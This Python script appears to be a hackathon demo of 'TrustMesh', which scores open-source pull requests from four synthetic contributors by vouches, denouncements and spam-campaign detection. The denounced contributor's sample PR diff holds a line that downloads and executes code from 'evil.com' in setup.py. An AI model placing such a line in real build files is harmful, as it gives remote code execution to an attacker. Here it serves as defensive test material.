#!/usr/bin/env python3
"""
TrustMesh Unified End-to-End Demo — Hack Day Sonipat (Problem 07)
Demonstrates multi-signal evaluation across all 4 contributor personas:
1. @alice_vouched: Transitive Web-of-Trust verification (Fast-track)
2. @dan_denounced: Validated peer denouncement (Quarantined)
3. @sybil_bot_014: Coordinated cross-repo spam campaign (Quarantined)
4. @charlie_newbie: First-time honest contributor (Bayesian Triage)
"""

import sys
import json
import time
import warnings
from pathlib import Path

# Suppress urllib3 LibreSSL warnings on macOS
warnings.filterwarnings("ignore", category=UserWarning, module="urllib3")
warnings.filterwarnings("ignore", message=".*urllib3 v2 only supports OpenSSL.*")

# Ensure src/ and .venv site-packages are on sys.path
REPO_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(REPO_ROOT / "src"))

venv_site_pattern = REPO_ROOT / ".venv" / "lib"
if venv_site_pattern.is_dir():
    for site_pkg in venv_site_pattern.glob("python*/site-packages"):
        if str(site_pkg) not in sys.path:
            sys.path.insert(1, str(site_pkg))

from trustmesh.models import PREvent
from trustmesh.evaluator import TrustMeshEngine

# ANSI formatting codes
RESET = "\033[0m"
BOLD = "\033[1m"
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
DIM = "\033[2m"


def main():
    print(f"\n{BOLD}{CYAN}{'=' * 82}{RESET}")
    print(f"{BOLD}{CYAN}   TrustMesh — Unified Evaluation & Bayesian Newcomer Triage Engine{RESET}")
    print(f"{DIM}   Hack Day Sonipat (Problem 07: Decentralized Trust Network for Open Source){RESET}")
    print(f"{BOLD}{CYAN}{'=' * 82}{RESET}\n")

    # 1. Initialize Unified Engine
    engine = TrustMeshEngine(trust_threshold=0.5)
    inspecting_repo = "Your-Project"
    base_time = time.time() - 3600.0

    print(f"{BOLD}[1] Initializing Web-of-Trust Peering Graph:{RESET}")
    engine.network.add_project_trust(inspecting_repo, "Project-B", weight=0.95, context="Verified upstream dependency")
    engine.network.add_project_trust(inspecting_repo, "Project-C", weight=0.90, context="Security auditing alliance")
    print(f"  • {GREEN}✓ Peered:{RESET} {inspecting_repo} ──(0.95)──> Project-B")
    print(f"  • {GREEN}✓ Peered:{RESET} {inspecting_repo} ──(0.90)──> Project-C")
    print(f"  • {YELLOW}⚠ Unpeered:{RESET} Project-X is untrusted by {inspecting_repo} (Reputation: 0.00)\n")

    # 2. Register Network Assertions
    print(f"{BOLD}[2] Registering Network Vouches & Denouncements:{RESET}")
    engine.network.add_vouch(
        "Project-B",
        "alice_vouched",
        confidence=0.95,
        notes="Core contributor to cryptography subroutines",
    )
    print(f"  • {GREEN}✓ Positive Vouch:{RESET} Project-B vouched for @alice_vouched (Conf: 0.95)")

    engine.network.add_denouncement(
        "Project-C",
        "dan_denounced",
        severity=0.90,
        reason="Malicious obfuscated dependency payload injection in package.json",
    )
    print(f"  • {RED}✗ Peer Denouncement:{RESET} Project-C denounced @dan_denounced (Severity: 0.90)")

    engine.network.add_denouncement(
        "Project-X",
        "charlie_newbie",
        severity=1.00,
        reason="Unsubstantiated competitor harassment claim",
    )
    print(f"  • {YELLOW}⚠ Untrusted Denouncement:{RESET} Untrusted Project-X attacked @charlie_newbie (Severity: 1.00)\n")

    # 3. Simulate 38-PR Coordinated Spam Stream
    spam_prs = []
    spam_titles = [
        "Fixed typo in README",
        "Fix minor typo in README.md",
        "Update docs header typo",
        "Corrected typo in README file",
    ]
    for i in range(38):
        spam_prs.append(
            PREvent(
                pr_id=f"pr_spam_{i:03d}",
                repo_id=f"ecosystem/target-repo-{i:03d}" if i != 14 else inspecting_repo,
                author=f"sybil_bot_{i:03d}",
                account_age_days=2.0,
                timestamp=base_time + (i * 3000.0 / 38.0),
                title=spam_titles[i % len(spam_titles)],
                diff_content="- The trust network are initialized.\n+ The trust network is initialized.",
                files_changed=["README.md"],
            )
        )

    # 4. Construct the 4 Evaluation Pull Requests
    test_cases = [
        (
            "@alice_vouched (Transitive Vouch)",
            PREvent(
                pr_id="pr_alice_001",
                repo_id=inspecting_repo,
                author="alice_vouched",
                account_age_days=180.0,
                timestamp=base_time + 120.0,
                title="feat: implement eigen-trust vectorized propagation in C++ core",
                diff_content="+def propagate_eigen(): return weights * adj",
                files_changed=["src/trustmesh/engine.py"],
            ),
        ),
        (
            "@dan_denounced (Peer Denounced)",
            PREvent(
                pr_id="pr_dan_002",
                repo_id=inspecting_repo,
                author="dan_denounced",
                account_age_days=60.0,
                timestamp=base_time + 400.0,
                title="build: add external analytics script to setup lifecycle",
                diff_content="+import urllib.request; exec(urllib.request.urlopen('evil.com').read())",
                files_changed=["setup.py"],
            ),
        ),
        (
            "@sybil_bot_014 (Coordinated Campaign)",
            spam_prs[14],  # one of the 38 spam PRs hitting Your-Project
        ),
        (
            "@charlie_newbie (First-time Contributor)",
            PREvent(
                pr_id="pr_charlie_004",
                repo_id=inspecting_repo,
                author="charlie_newbie",
                account_age_days=1.5,
                timestamp=base_time + 850.0,
                title="fix: resolve off-by-one boundary check in graph traversal",
                diff_content="-if i <= max_hops:\n+if i < max_hops:",
                files_changed=["src/trustmesh/graph.py"],
            ),
        ),
    ]

    # Ingestion stream includes history of the spam wave
    event_stream = spam_prs + [tc[1] for tc in test_cases if tc[1] not in spam_prs]

    print(f"{BOLD}[3] Executing Unified Decision Audits across All 4 Personas:{RESET}\n")

    decisions = []
    for label, pr in test_cases:
        decision = engine.audit_pull_request(inspecting_repo, pr, event_history=event_stream)
        decisions.append((label, decision))

    # 5. Render Comparison Table
    print("┌" + "─" * 80 + "┐")
    print(f"│ {BOLD}UNIFIED TRUST DECISION MATRIX (PROBLEM 07 COMPLIANT){RESET}{' ' * 27}│")
    print("├" + "─" * 80 + "┤")
    print(
        f"│ {BOLD}{'Contributor':<17} │ {'WoT':<5} │ {'Spam':<5} │ {'E[T]':<6} │ {'Var(T)':<7} │ {'Verdict':<28}{RESET}│"
    )
    print("├" + "─" * 80 + "┤")

    for label, d in decisions:
        wot_badge = f"{GREEN}YES{RESET}" if d.is_vouched else f"{DIM}NO{RESET} "
        spam_badge = f"{RED}HIT{RESET}" if d.is_campaign_member else f"{GREEN}CLR{RESET}"

        if d.verdict == "ALLOW_VOUCHED":
            v_badge = f"{GREEN}{BOLD}ALLOW_VOUCHED{RESET}"
        elif d.verdict == "QUARANTINE_DENOUNCED":
            v_badge = f"{RED}{BOLD}QUARANTINE_DENOUNCED{RESET}"
        elif d.verdict == "QUARANTINE_CAMPAIGN":
            v_badge = f"{MAGENTA}{BOLD}QUARANTINE_CAMPAIGN{RESET}"
        else:
            v_badge = f"{YELLOW}{BOLD}HONEST_NEWCOMER_TRIAGE{RESET}"

        c_name = d.contributor_id[:16]
        print(
            f"│ {CYAN}{c_name:<17}{RESET} │ {wot_badge} │ {spam_badge} │ {d.bayesian_expected_trust:<6.2f} │ {d.bayesian_uncertainty:<7.4f} │ {v_badge:<37}│"
        )
        print(f"│   └── {DIM}Action: {d.action_recommendation[:71]}{RESET}│")

    print("└" + "─" * 80 + "┘")

    # 6. Machine-Readable OpenVEX / JSON Output for @charlie_newbie
    charlie_decision = next(d for l, d in decisions if d.contributor_id == "charlie_newbie")
    vex_document = {
        "@context": "https://openvex.dev/ns/v0.2.0",
        "@id": f"trustmesh:audit:{charlie_decision.pr_id}",
        "author": "TrustMesh Unified Engine v0.1.0",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "statement": {
            "subject": {
                "contributor": charlie_decision.contributor_id,
                "pull_request": charlie_decision.pr_id,
                "target_repository": charlie_decision.target_repo,
            },
            "status": charlie_decision.verdict,
            "justification": "epistemic_uncertainty_non_exclusionary_triage",
            "impact_statement": charlie_decision.action_recommendation,
            "bayesian_inference": {
                "expected_trust": charlie_decision.bayesian_expected_trust,
                "epistemic_variance": charlie_decision.bayesian_uncertainty,
                "prior": "Beta(1.0, 1.0) uninformative Laplace prior",
            },
            "evidence_trace": charlie_decision.evidence_trace,
        },
    }

    print(f"\n{BOLD}[4] Machine-Readable OpenVEX / JSON Attestation (@charlie_newbie):{RESET}")
    print(f"{CYAN}{json.dumps(vex_document, indent=2)}{RESET}")

    print(f"\n{BOLD}{GREEN}✔ All 4 scenarios validated:{RESET}")
    print("  1. Provenance fast-tracked (@alice_vouched).")
    print("  2. Malicious peer denouncements quarantined (@dan_denounced).")
    print("  3. Coordinated multi-repo bot wave quarantined (@sybil_bot_014).")
    print(f"  4. {BOLD}Honest newcomer protected from automatic exclusion via Bayesian triage (@charlie_newbie).{RESET}\n")

    return 0


if __name__ == "__main__":
    sys.exit(main())

